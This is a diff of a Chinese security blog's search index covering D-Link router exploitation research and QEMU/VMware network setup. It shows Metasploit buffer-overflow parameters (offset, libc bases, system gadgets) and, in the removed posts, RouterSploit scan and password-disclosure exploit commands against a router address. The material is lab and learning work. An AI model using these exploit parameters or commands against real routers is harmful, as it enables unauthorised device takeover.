@@ -1566,12 +1463,12 @@ Service Info: OS: Linux; Device: WAP; CPE: cpe:/h:dlink:dir-815:1.01, cpe:/o:lin
 <p>其实这里需要跟之前qemu系统模式一样，上传gdbsever进行调试确定偏移和libc基地址。这里直接利用师傅帖子中的代码进行测试。这里的基地址是根据firmadyne中用linux内核版本为2.6.32，别的帖子中测试的基地址为0x2aaf8000，并且metasploit里面的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb" target="_blank" rel="noopener">payload</a>写到：路由器环境中基地址为0x2aaf8000，qemu环境为0x40854000。两个可以都试试！</p>
 <pre class=" language-sh"><code class="language-sh">[ 'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600',
             {
-              'Offset'      =&gt; 973,
-              'LibcBase'    =&gt; 0x2aaf8000,    # Router
-              #'LibcBase'   =&gt; 0x40854000,    # QEMU environment
-              'System'      =&gt; 0x000531FF,    # address of system
-              'CalcSystem'  =&gt; 0x000158C8,    # calculate the correct address of system
-              'CallSystem'  =&gt; 0x000159CC,    # call our system
+              'Offset'      => 973,
+              'LibcBase'    => 0x2aaf8000,    # Router
+              #'LibcBase'   => 0x40854000,    # QEMU environment
+              'System'      => 0x000531FF,    # address of system
+              'CalcSystem'  => 0x000158C8,    # calculate the correct address of system
+              'CallSystem'  => 0x000159CC,    # call our system
             }
           ]</code></pre>
 <p>下面编写exp进行测试，利用system函数进行测试。</p>
@@ -1624,25 +1521,7 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
 <p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell" target="_blank" rel="noopener">Building MIPS Environment for Router &amp;&amp; PWN</a> </p>
 <p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a> </p>
 <p><a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">一个mips栈溢出</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <categories>
         <category>iot</category>
       </categories>
@@ -2015,321 +1894,11 @@ LAB_00407e40<span class="token punctuation">:</span>
 <p>函数返回时，uid的内容存储在之前sobj_new()的结构体s5=0x42e008的0x14处。</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实这算第一次这样仔细的阅读并调试汇编源码（虽然还是借助了ghidra的反汇编功能进行理解），还是太菜了呀，整个过程还是花了挺多时间的，但现在看来感觉还是挺值的，因为整个流程下来我对MIPS汇编代码理解以及寄存器的运用还有gdb、IDA的联调有了相对熟练的掌握，为以后静态和动态分析开一个好头吧！然后这篇文章的目的也是为了整理梳理整个思路然后以文字的形式记录下来。</p>
 ]]></content>
-      <categories>
-        <category>iot</category>
-      </categories>
-      <tags>
-        <tag>dlink</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VM虚拟机ubuntu16.04的网络桥接配置</title>
-    <url>/2020/04/07/ubuntu16-04-de-wang-luo-qiao-jie-pei-zhi/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么会记录这个过程，因为昨天想起了路由器有个类似与metasploit的工具<a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">routersploit</a>，之前在ubuntu18.04上装过，好像用了出现问题没跑起来。这次在16.04上安装，并结合firmadyne对其进行测试。对于DIR-815仿真起来之后，routersploit能够扫描到其中的一个洞，但是其他的洞没有payload。然后我用routersploit扫描家里TP-link路由器出现问题了，当时我以为虚拟机用NAT模式，导致在192.168.91.0/24网段，但是路由器地址是192.168.0.1。想着配置虚拟机在192.168.0.0/24网段不就行了。我真是个机灵鬼，结果发现并不是这个问题。不过也学习了一波虚拟机网络配置三种模式。</p>
-<h1 id="routersploit"><a href="#routersploit" class="headerlink" title="routersploit"></a>routersploit</h1><p>Exploitation Framework for Embedded Devices，针对嵌入式设备的利用框架。具体里面的架构没有仔细研究，目前只停留在使用阶段。使用界面是一个命令交互式界面。目前最新的版本是3.4.1，里面有132个exploits，32个payloads。当然可以自己扩展。</p>
-<p><img src="routersploit.png" alt=""></p>
-<p>routersploit的使用步骤在github上的一个演示视频中有演示。总结起来：</p>
-<h2 id="扫描目标查找当前漏洞库中存在的漏洞"><a href="#扫描目标查找当前漏洞库中存在的漏洞" class="headerlink" title="扫描目标查找当前漏洞库中存在的漏洞"></a>扫描目标查找当前漏洞库中存在的漏洞</h2><pre class=" language-shell"><code class="language-shell">use scanners/autopwn #选择自动扫描模式
-set target 192.168.0.1 #设置目标
-run</code></pre>
-<p><img src="vulnerablity.png" alt=""></p>
-<h2 id="显示目标的漏洞，选择exploit"><a href="#显示目标的漏洞，选择exploit" class="headerlink" title="显示目标的漏洞，选择exploit"></a>显示目标的漏洞，选择exploit</h2><pre class=" language-sh"><code class="language-sh">use exploits/routers/dlink/dir_8xx_password_disclosure #选择exploit
-set target 192.168.0.1 #设定目标这里需要重新设置不然show options显示目标为空
-check #再次检测目标是否存在该漏洞，若存在会显示[+] Target is vulnerable
-run</code></pre>
-<p>该exploit是泄漏dir_8xx的默认密码。</p>
-<p><img src="password_disclosure.png" alt=""></p>
-<p>本次仿真的目标是D-LINK DIR-859路由器。</p>
-<p><img src="DIR859.png" alt=""></p>
-<p>不需要密码就能登陆。</p>
-<p><img src="login.png" alt=""></p>
-<h2 id="选择攻击载荷"><a href="#选择攻击载荷" class="headerlink" title="选择攻击载荷"></a>选择攻击载荷</h2><pre class=" language-shell"><code class="language-shell">show payloads
-set payload xxxx
-set lhost 本机ip
-run</code></pre>
-<p><img src="show_payloads.png" alt=""></p>
-<p>但是会在选择攻击载荷的时候会遇到没有Payload的情况，可以自己编写扩展进去。或者根本就利用不起来，下面的情况就是利用不起来。</p>
-<h1 id="测试家用实体路由器遇到的问题"><a href="#测试家用实体路由器遇到的问题" class="headerlink" title="测试家用实体路由器遇到的问题"></a>测试家用实体路由器遇到的问题</h1><p>利用routersploit测试TP-Link TL-WR886N型号实体路由器时（web服务器访问地址也是192.168.0.1）</p>
-<p><img src="TL-WR886N.png" alt=""></p>
-<p>扫描出存在漏洞，但是无法利用。</p>
-<p><img src="set_payload.png" alt=""></p>
-<p>github该项目上同样有许多人提出这个<a href="https://github.com/threat9/routersploit/issues/550" target="_blank" rel="noopener">issue</a>(Could not set up HTTP server on lhost / can’t transfer payload)。</p>
-<p>我想着是哪里出了问题，之前ubuntu虚拟机的ip是利用NAT模式设置的网络，所以IP是192.168.91.0/24网段的，我以为是IP不在一个网段导致的，所以就想着改下IP。就学习了VM虚拟机配置网络的3种方式。以下内容参考<a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">Vmware虚拟机三种网络模式详解</a></p>
-<h1 id="VMware-三种网络工作模式"><a href="#VMware-三种网络工作模式" class="headerlink" title="VMware 三种网络工作模式"></a>VMware 三种网络工作模式</h1><p>vmware为我们提供了三种网络工作模式，它们分别是：<strong>Bridged（桥接模式）</strong>、<strong>NAT（网络地址转换模式）</strong>、<strong>Host-Only（仅主机模式）</strong>。 </p>
-<p>打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet0（桥接模式）、VMnet1（仅主机模式）、VMnet8（NAT模式）。其实看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。 </p>
-<p><img src="%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E7%BC%96%E8%BE%91%E5%99%A8.png" alt=""></p>
-<p>同时，在主机上对应的有VMware Network Adapter VMnet1和VMware Network Adapter VMnet8两块虚拟网卡，它们分别作用于仅主机模式与NAT模式下。在“网络连接”中我们可以看到这两块虚拟网卡，如果将这两块卸载了，可以在vmware的“编辑”下的“虚拟网络编辑器”中点击“还原默认设置”，可重新将虚拟网卡还原。 </p>
-<p><img src="%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%BD%91%E5%8D%A1.png" alt=""></p>
-<h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><p>桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。其网络结构如下图所示： </p>
-<p><img src="%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt=""></p>
-<h3 id="设置桥接模式"><a href="#设置桥接模式" class="headerlink" title="设置桥接模式"></a>设置桥接模式</h3><ol>
-<li><p>在物理机上：网络共享中心-&gt;本地连接-&gt;属性-&gt;勾选桥接模式协议 </p>
-<p><img src="%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%E5%8D%8F%E8%AE%AE.png" alt=""></p>
-</li>
-<li><p>在Vmware上 虚拟机-&gt;设置-&gt;网络适配器-&gt;勾选桥接模式 </p>
-<p><img src="%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt=""></p>
-</li>
-<li><p>Vmware 编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;选中桥接模式</p>
-<p><img src="%E9%80%89%E6%8B%A9%E7%BD%91%E5%8D%A11.png" alt=""></p>
-<p>（选择好桥接的网卡，我之前选择的自动导致网络无法连接）</p>
-<p><img src="%E9%80%89%E6%8B%A9%E7%BD%91%E5%8D%A1.png" alt=""></p>
-</li>
-<li><p>进入虚拟机更改网卡配置</p>
-<p>物理机IP信息（这张图是别人的图不是我自己的图）</p>
-<p><img src="%E7%89%A9%E7%90%86%E6%9C%BAIP%E4%BF%A1%E6%81%AF.png" alt=""></p>
-<ul>
-<li><p>更改IP</p>
-<p><code>sudo vim /etc/network/interfaces</code><strong>注意这个ip的网段（子网）要跟你的物理机是一样的。</strong> （下面的图也是比人的图，可能跟上面那张图不匹配，但是意思没错）</p>
-<p><img src="interface.png" alt=""></p>
-</li>
-<li><p>设置DNS文件</p>
-<p><code>sudo vim /etc/resolv.conf</code><strong>DNS服务器一定要一样</strong></p>
-<p><img src="DNS%E9%85%8D%E7%BD%AE.png" alt=""></p>
-</li>
-<li><p>重启网络</p>
-<p><code>sudo /etc/init.d/networking restart</code></p>
-<p>ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 试试能否成功！</p>
-</li>
-</ul>
-</li>
-</ol>
-<h2 id="NAT-网络地址转换"><a href="#NAT-网络地址转换" class="headerlink" title="NAT(网络地址转换)"></a>NAT(网络地址转换)</h2><p>如果你的网络ip资源紧缺，但是又希望虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。其网络结构如下图所示： </p>
-<p><img src="NAT%E6%A8%A1%E5%BC%8F.png" alt=""></p>
-<p>在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。此时主机如果卸载掉VMnet8，虚拟机也能连上外网，但是虚拟机无法跟主机通信。*<em>VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。 *</em></p>
-<p>而且使用NAT模式时，虚拟机能够访问在同一片局域网（连接同一个路由器）中的其他主机，但是其他主机无法访问虚拟机。像下图（2011年一个博主发的，理解上有点偏差），用这图的意思就是想说，使用Vmnet8虚拟交换机，此时虚拟机可以通过主机访问其他主机，其他主机不能访问虚拟机。其网络拓扑如图2所示，使用NAT方式，A1，A2可以访问B，但B不可以访问A1，A2。但A，A1，A2可以互访。</p>
-<p><img src="NAT%E6%A8%A1%E5%BC%8F2.png" alt=""></p>
-<h2 id="Host-Only（仅主机模式）"><a href="#Host-Only（仅主机模式）" class="headerlink" title="Host-Only（仅主机模式）"></a>Host-Only（仅主机模式）</h2><p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示： </p>
-<p><img src="%E4%BB%85%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F1.png" alt=""></p>
-<p> 通过上图，可以发现，如果要使得虚拟机能联网，可以将主机网卡共享给VMware Network Adapter VMnet1网卡，从而达到虚拟机联网的目的。 具体配置可以参考<a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">这篇文章</a></p>
-<p>我个人应该不会设置成仅主机模式之后用它来连外网。</p>
-<p>最终我将我的一个ubuntu16.04虚拟机配置成桥接模式，让其能够跟统一个局域网中的其他主机互访，让后用routersploit测试还是出现之前的问题。</p>
-<p><img src="%E6%B5%8B%E8%AF%95%E5%A4%B1%E8%B4%A5.png" alt=""></p>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p> <a href="https://blog.csdn.net/shuxiao9058/article/details/7051463" target="_blank" rel="noopener">https://blog.csdn.net/shuxiao9058/article/details/7051463</a> </p>
-<p> <a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">Vmware虚拟机三种网络模式详解</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>ubuntu</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Linux以及qemu网络配置的学习</title>
-    <url>/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/</url>
-    <content><![CDATA[<p>最近一直在使用firmadyne仿真固件，因为firmadyne主要还是利用qemu的系统模式加载预先编译好的Linux内核将固件文件系统托起，从而模拟Linux系统的嵌入式设备的运行。在firmadyne推断网络配置之后生成run.sh文件。其中有关配置网卡部分，以便qemu与宿主机进行通信。在复现CVE进行仿真的时候会出现尽管配置好网卡但是无法通信的问题，所以对Linux以及Qemu的网络通信配置进行学习。</p>
-<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>QEMU中的网络，包含两部分的内容：</p>
-<ol>
-<li>客户机使用的虚拟网络设备,也就是客户机看到的仿真硬件，也叫作NIC。常见的有e1000 网卡，rt8139网卡，和virtio-net设备。这些统称为网络前端。</li>
-<li>和上述虚拟设备通信的网络后端，这些后端负责把虚拟设备的数据包发到宿主机的网络中。既QEMU用来跟host上外部网络交换数据的东西。最常见的后端是“user”，用来提供NAT的主机网络访问。tap后端，可以让guest直接访问主机的网络。还有socket类型的后端，用来连接多个QEMU实例，来仿真一个共享网络。</li>
-</ol>
-<p>要创建一个网络后端，可以指定如下选项：</p>
-<pre><code># TYPE为后端类型：user、tap、bridge、socket、vde等
-# id为一个标识符，将虚拟网络设备和网络后端关联在一起
-# 如果客户机有多个虚拟网络设备，则每一个都需要自己的网络后端
--netdev TYPE,id=NAME,...</code></pre><ul>
-<li>-net选项可以定义前端和后端；</li>
-<li>-netdev选项只能定义后端；</li>
-<li>-nic可以一条命令定义前端和后端；</li>
-</ul>
-<h2 id="net选项"><a href="#net选项" class="headerlink" title="-net选项"></a>-net选项</h2><p>QEMU最初的guest网络配置方式是-net选项。可以通过-net nic,model=xyz,…来配置guest NIC，然后通过-net <backend>,…来配置host 后端（例如：-net user）。但是呢，仿真的NIC和host的后端并不是直接相连的。他们通过一个相同的仿真hub连在一起，这个组件在以前的QEMU里面叫做vlan。以<code>-net nic,model=e1000 -net user -net nic,model=virtio -net tap</code>为例，启动qemu，他们的连接如下示意图：</backend></p>
-<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/v2-92732a5754c899e794152c880940b0e8_720w.jpg" alt=""></p>
-<p>这意味着，e1000网卡可以看到其他三个的网络流量。这种方式并不是用户期待的。用户更期望的是看到两个独立的guest网络，以及两个独立的host 后端，他们一一对应。为了达到这个目的，你不得不告诉QEMU，我要使用两个单独的hub。通过vlan参数可以指定不同的vlan。例如：<code>-net nic,model=e1000,vlan=0 -net user,vlan=0 -net nic,model=virtio,vlan=1 -net tap,vlan=1</code>。这样，virtio NIC和tap 后端就连到了第二个hub了。</p>
-<p>注意，“vlan”参数将在QEMU 3.0版本被移除。因为这个vlan术语跟现在常用的网络中的vlan不是一个概念，会带来很多误解。-net选项依然是保留的。-net可以分别配置前端和后端，可以做到一对一，或者多对一。例如：<code>-net nic,model=e1000 -net nic,model=virtio -net l2tpv3</code></p>
-<h2 id="更现代的-netdev选项"><a href="#更现代的-netdev选项" class="headerlink" title="更现代的-netdev选项"></a>更现代的-netdev选项</h2><p>上面提到的-net配置前后端，他们中间必须有一个hub相连。有了这个hub，vhost 就没法在virtio 上启用。不再需要vlan来指定对应的设备能够互相通信，通过id的形式达到一对一的目的。</p>
-<p>为了配置guest NIC和后端直接相连的网络，需要使用-netdev和-device搭配使用。例如，需要配置同-net一样的网络，使用-netdev和-device的方式如下：</p>
-<p><code>-netdev user,id=n1 -device e1000,netdev=n1 -netdev tap,id=n2 -device virtio-net,netdev=n2</code>.</p>
-<p>他们的连接方式是一对一的直接连接，如下图所示：</p>
-<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/v2-82ed3e383d41c406471838a2cdd3056a_720w.jpg" alt=""></p>
-<p>-netdev/-device存在以下两个弊端：</p>
-<ul>
-<li>使用麻烦，在某些场景下不如-net方便。例如创建默认的tap网络，可以使用定义好的/etc/qemu-ifup和/etc/qemu-ifdown脚本。例如，可以简单的使用-net nic -net tap。如果使用-netdev/-device，命令就很长了，还不得不取一个id：<code>-netdev tap,id=n1 -device e1000,netdev=n1</code>.</li>
-<li>板载的NIC不能配置成-netdev/-device。</li>
-</ul>
-<h2 id="新的-nic选项"><a href="#新的-nic选项" class="headerlink" title="新的-nic选项"></a>新的-nic选项</h2><p>上面的两种方式都有各自的局限，新的nic选项，有以下优势：</p>
-<ul>
-<li>比netdev容易使用。netdev命令太长：-netdev <backend>,id=<id> -device <dev>,netdev=<id></id></dev></id></backend></li>
-<li>可以配置板载或者可插拔的NIC；</li>
-<li>NIC和host后端直接相连；</li>
-<li>可以一条命令配置NIC和host 后端；</li>
-</ul>
-<p>例如： -netdev tap,id=n1 -device e1000,netdev=n1可以替换成： -nic tap,model=e1000。model参数还可以被省略。这个也比<code>-net nic -net tap</code>方便。 可以用过qemu-system-x86_64 -nic model=help来查看支持的model列表。</p>
-<h1 id="QEME支持多种网络后端与外部网络通信"><a href="#QEME支持多种网络后端与外部网络通信" class="headerlink" title="QEME支持多种网络后端与外部网络通信"></a>QEME支持多种网络后端与外部网络通信</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>为了使虚拟机能够与外界通信，Qemu需要为虚拟机提供网络设备。命令行上用-net nic为虚拟机创建虚拟机网卡。例如，qemu的命令行选项<code>-net nic,model=pcnet</code> 表示为虚拟机添加一块pcnet型的以太网卡。如果省略model参数则qemu会默认选择一种 e1000 网卡类型。</p>
-<p>有了虚拟网络设备，下面的问题是如何用这些设备来联网。每个qemu的运行实例是宿主机中的一个进程，而每个这样的进程中可以虚拟一些VLAN，虚拟机网络设备接入这些VLAN中。当某个VLAN上连接的网络设备发送数据帧，与它在同一个VLAN中的其它网路设备都能接收到数据帧。上面的例子中对虚拟机的pcnet网卡没有指定其连接的VLAN号，那么qemu默认会将该网卡连入vlan0。下面这个例子更具一般性：</p>
-<p><code>-net nic,model=pcnet -net nic,model=rtl8139,vlan=1, -net nic,model=ne2k_pci,vlan=1</code></p>
-<p>该命令为虚拟机创建了三块网卡，其中第一块网卡类型是pcnet，连入vlan0；第二块网卡类型是 rtl8139，第三块网卡类型是ne2k_pci，这两块都连入vlan1，所以第二块网卡与第三块网卡可以互相通信，但它们与第一块网卡不能直接通信。 </p>
-<p>各个VLAN通过qemu提供的4种通信方式与外界联网：</p>
-<p>使用用户模式的客户机可以连通宿主机及外部网络。用户模式网络完全由QEMU模拟实现整个TCP/IP协议栈，并且使用这个协议栈提供一个虚拟的NAT网络。它不依赖于宿主机上的网络工具组件，如bridge-utils、tunctl、dnsmasq、iptables等，因此也不需要root用户权限。</p>
-<ol>
-<li><p>User mode stack：使用用户模式的客户机可以连通宿主机及外部网络，外部网络不能主动与虚拟机通信。这种方式<strong>由QEMU实现整个TCP/IP协议栈</strong>，并且使用这个协议栈提供一个<strong>虚拟的NAT网络</strong>。负责在虚拟机VLAN和外部网络之间转发数据。它不依赖于宿主机上的网络工具组件，如bridge-utils、tunctl、dnsmasq、iptables等，因此也不需要root用户权限。当然，用户模式网络的缺陷也是明显的：<strong>因其在QEMU内部实现所有网络协议栈，相对性能较差。</strong> 虚拟机VLAN中的各个网络接口只能置于<strong>10.0.2.0</strong>子网中，此外，可以用<code>-redir</code>选项为宿主机和虚拟机的两个TCP或UDP端口建立映射，实现宿主机和虚拟机在特殊要求下的通信（例如X-server或ssh）。<strong>这种方式实现虚拟机上网很简单，类似vmware里的nat,qemu启动时加入-net user选项，虚拟机里使用dhcp方式， (如果没有指定<code>-net xx</code>这是默认配置)。**</strong>如果没有指定网络选项，QEMU默认会模拟单张Intel e1000 PCI网卡，该网卡基于user后端（SLIRP）连接到宿主机**</p>
-<pre><code># 不指定网络
-qemu 
-# 等价配置。自0.12开始废弃的配置方式 -net nic相当于-device DEVNAME；-net TYPE相当于-netdev TYPE
-qemu -hda disk.img -net nic -net user
-# 等价配置。-netdev指定网络后端，-device指定虚拟网络设备，后者通过netdev字段引用后端的ID
-qemu -netdev user,id=network0 -device e1000,netdev=network0</code></pre></li>
-<li><p>socket：这种方式又分为TCP和UDP两种类型。<br>（1）TCP：为一个VLAN创建一个套接字，让该套接字在指定的TCP端口上监听，而其他VLAN连接到该套接字上，从而将多个VLAN连接起来。缺点在于<strong>如果监听套接字所在qemu进程崩溃，整个连接就无法工作</strong>。监听套接字所在VLAN通过<code>-net socket,listen</code>选项启用，其他VLAN通过<code>-net socket,connect</code>选项启用。<br>（2）UDP：所有VLAN连接到一个多播套接字上，从而使多个VLAN通过一个总线通信。所有VLAN都通过<code>-net socket,mcast</code>选项启用。</p>
-<p>通过参数<code>-netdev socket</code> (或<code>-nic socket</code>或<code>-net socket</code>) 可以实现多个虚拟机之间的互联。 </p>
-</li>
-<li><p>TAP：这种方式要比user mode复杂一些，但是设置好后 虚拟机&lt;–&gt;互联网 虚拟机&lt;–&gt;主机 通信都很容易，类似vmware的host-only,qemu使用tun/tap设备在主机上增加一块虚拟网络设备(tun0),然后就可以象真实网卡一样配置它。</p>
-<p>这种方式首先需要在宿主机中创建并配置<strong>一个TAP设备</strong>，TAP被用于创建一个网桥，而TUN与路由相关，桥接就是把一台机器上的若干个网络接口“连接”起来。其结果是，其中一个网口收到的报文会被复制给其他网口并发送出去。以使得网口之间的报文能够互相转发。局域网内可以通过ssh登陆虚拟机。</p>
-<p>qemu进程将该TAP设备连接到虚拟机VLAN中。其次，为了实现虚拟机与外部网络的通信，在宿主机中通常还要<strong>创建并配置一个网桥</strong>，并将宿主机的网络接口（通常是eth0）作为<strong>该网桥的一个接口</strong>。最后，只要将<strong>TAP设备作为网桥的另一个接口</strong>，虚拟机VLAN<strong>通过TAP设备</strong>就可以与外部网络完全通信了。这是因为，宿主机的eth0接口作为网桥的接口，与外部网络连接；TAP设备作为网桥的另一个接口，与虚拟机VLAN连接，这样两个网络就连通了。此时，网桥在这两个网络之间转发数据帧。<br>这里有两个问题需要注意：<br>（1）网桥的转发工作需要得到内核的支持，所以在编译宿主机内核时需要选择与桥接相关的配置选项。<br>（2）<strong>当宿主机eth0接口作为网桥接口时，不能为其配置IP地址，而要将IP地址配置给网桥。</strong><br>TAP方式由<code>-net tap</code>选项启用。</p>
-</li>
-<li><p>VDE：这种方式首先要启动一个VDE进程，该进程打开一个TAP设备，然后各个虚拟机VLAN与VDE进程连接，这样各个VLAN就可以通过TAP设备连接起来。VDE进程通过执行<code>vde_switch</code>命令启动，各个VLAN所在qemu进程通过执行<code>veqe</code>命令启动，这些VLAN就可以与VDE进程连接了。</p>
-<p>以上四种通信方式中，socket方式和VDE方式用于虚拟机VLAN之间的连接，而user mode stack方式与外部网路的通信比较有限，<strong>Firmadyne中也是利用TAP方式配置qemu网络</strong>，所以下面主要讨论TAP方式的配置。 </p>
-</li>
-</ol>
-<h2 id="qemu网络配置（TAP方式）"><a href="#qemu网络配置（TAP方式）" class="headerlink" title="qemu网络配置（TAP方式）"></a>qemu网络配置（TAP方式）</h2><p>参照 <a href="https://zh.wikipedia.org/wiki/TUN与TAP" target="_blank" rel="noopener">wiki</a> 对TAP/TUN介绍。<strong>TUN/TAP是操作系统内核支持的网络虚拟设备</strong>，这种网络设备完全由的软件实现。与网络硬件设备不同，TUN/TAP负责<strong>在内核协议栈与用户进程之间传送协议数据单元</strong>。TUN与TAP的区别在于，TUN工作在网络层，而TAP则工作在数据链路层。具体在运行TCP/IP的以太网中，TUN与应用程序交换IP包，而TAP与应用程序交换以太帧。所以TUN通常涉及路由，而TAP则常用于网络桥接。TUN/TAP的典型应用包括：虚拟私有网络OpenVPN、OpenSSH 以及虚拟机器QEMU、KVM。 </p>
-<h3 id="具体配置过程"><a href="#具体配置过程" class="headerlink" title="具体配置过程"></a>具体配置过程</h3><ol>
-<li><p>首先确定你的机器支持 TAP/TUN 虚拟设备</p>
-</li>
-<li><p>安装两个配置网络所需软件包： </p>
-<pre class=" language-sh"><code class="language-sh">apt-get install bridge-utils        # 虚拟网桥工具
-apt-get install uml-utilities       # UML（User-mode linux）工具</code></pre>
-</li>
-<li><p>配置虚拟网桥的操作（假设系统启动后eth0已经启动，并且从DHCP获得IP地址）</p>
-<p>一次性操作，每次重启失效。最好写一个脚本，重启之后可以批处理。</p>
-<pre class=" language-sh"><code class="language-sh">#相关指令整理
-ifconfig <你的网卡名称(能上网的那张)> down    # 首先关闭宿主机网卡接口
-brctl addbr br0                     # 添加一座名为 br0 的网桥
-brctl addif br0 <你的网卡名称>        # 在 br0 中添加一个接口
-brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议
-brctl setfd br0 1                   # 设置 br0 的转发延迟
-brctl sethello br0 1                # 设置 br0 的 hello 时间
-ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口
-ifconfig <你的网卡名称> 0.0.0.0 promisc up    # 启用网卡接口，作为网桥的一端
-dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址
-brctl show br0                      # 查看虚拟网桥列表
-brctl showstp br0                   # 查看 br0 的各接口信息
-
-#在没有dhcp服务器的网络中也可以用ifconfig命令为br0接口配置一个静态IP地址：
-ifconfig br0 192.168.0.22 netmask 255.255.255.0
-route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.0.254</code></pre>
-<p>永久性操作，启动时自动配置。</p>
-<p>在之前的文章<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a>有提到在 /etc/network/interfaces 文件中配置网桥br0。</p>
-<pre class=" language-sh"><code class="language-sh">auto lo # linux中的回环网卡
-iface lo inet loopback
-auto ens33 # ubuntu16.04上网网卡
-iface ens33 inet manual #其实可以设置为dhcp启动不影响
-up ifconfig ens33 0.0.0.0 up
-auto br0 #增加网桥
-iface br0 inet dhcp #网桥的IP地址从dhcp服务器获得
-  bridge_ports ens33 #网桥
-  bridge_maxwait 0</code></pre>
-</li>
-<li><p>配置TAP设备作为网桥br0的另一端的操作：</p>
-<p>可以把一下命令也写/etc/network/interfaces文件中。 </p>
-<pre class=" language-sh"><code class="language-sh">tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问
-brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口
-ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口
-brctl showstp br0                   # 显示 br0 的各个接口</code></pre>
-<p>也可以在/etc/qemu-ifup（qemu启动时会运行的文件）中添加命令：</p>
-<pre class=" language-sh"><code class="language-sh">#! /bin/sh
